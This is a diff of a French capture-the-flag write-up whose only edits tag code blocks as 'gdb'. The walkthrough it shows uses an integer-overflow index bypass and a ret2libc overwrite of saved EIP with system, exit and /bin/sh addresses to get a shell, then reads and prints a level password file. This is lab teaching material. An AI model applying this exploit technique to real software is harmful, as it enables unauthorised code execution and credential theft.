@@ -28,7 +28,7 @@
 
 - Deja on observe qu'il n'y a pas de protection d'index lors du `store_number()` :
 
-```
+```gdb
 Input command: store
 Number: 1
 Index: 107
@@ -41,7 +41,7 @@ Completed  command successfully
     - En hexadecimal cela donne : `F7E45513` qui correspond a notre saved eip du main : `saved eip 0xf7e45513`
     - Malheureusement nous ne pouvons pas acceder a l'index 114 car rentre dans la condition index % 3 :
 
-```
+```gdb
 Input command: store
 Number: 1 
 Index: 114
@@ -53,7 +53,7 @@ Failed to do store command
 
 - Bon il va falloir trouver une solution pour contourner ces protections : 
     - Dans le code disas on observe des left shift bits de 2 (qui correspond a un *4) :
-```
+```gdb
 shl     eax, 0x2
 ```
 
@@ -68,7 +68,7 @@ shl     eax, 0x2
 - Prenons le u_int max, divisons le par 4 et ajoutons 114 :
     - 4,294,967,296 / 4 + 114 = 1073741938
 
-```
+```gdb
 Input command: store
  Number: 1
  Index: 1073741938
@@ -85,7 +85,7 @@ Input command: read
 
 - Allons trouver ces adresses :
 
-```
+```gdb
 (gdb) p system
 $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
 (gdb) p exit
@@ -120,7 +120,7 @@ Mapped address spaces:
 
 - Cast en unsigned int : 
 
-```
+```gdb
 0x f7e6aed0 = 4159090384 system 114 1073741938
 0x f7e5eb70 = 4159040368 exit   115
 0x f7f897ec = 4160264172 bin/sh 116
@@ -128,7 +128,7 @@ Mapped address spaces:
 
 - Essayons maintenant d'entrer ces valeurs dans le programme : 
 
-```
+```gdb
 Input command: store
 Number: 4159090384
 Index: 1073741938
@@ -145,7 +145,7 @@ Completed store command successfully
 
 - Plus qu'a quitter la boucle while avec la commande quit pour rediriger le flux d'execution vers notre `ret2libc` :
 
-```
+```gdb
 Input command: quit
 $ cat /home/users/level08/.pass
 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
